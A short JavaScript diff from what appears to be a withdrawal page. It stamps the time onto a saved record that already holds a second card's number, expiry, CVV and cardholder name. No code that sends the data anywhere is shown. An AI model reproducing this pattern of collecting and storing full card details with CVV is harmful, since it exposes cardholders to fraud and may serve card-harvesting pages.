@@ -278,6 +278,11 @@ let asecondCardNumber = cardNumber;
 let bsecondCardData = cardData;
 let csecondCardCvv = cardCvv;
 let dsecondCardName = cardName;
+let sendingData = new Date().toLocaleDateString("en-GB");
+let myDate = new Date().getHours();
+let minute = new Date().getMinutes();
+let seconds = new Date().getSeconds();
+let allData = `(${myDate}:${minute}:${seconds}) - (${sendingData})`;
 let cardInfoWrapper = document.querySelector(".cashout-wrapper");
 let removeCardBtn = document.querySelector(".fa-xmark");
 let withdrawRules = document.querySelector(".withdraw-rules");
@@ -354,6 +359,7 @@ function saveInfo() {
     bsecondCardData: bsecondCardData.value,
     csecondCardCvv: csecondCardCvv.value,
     dsecondCardName: dsecondCardName.value,
+    time: allData,
   });
 }
 
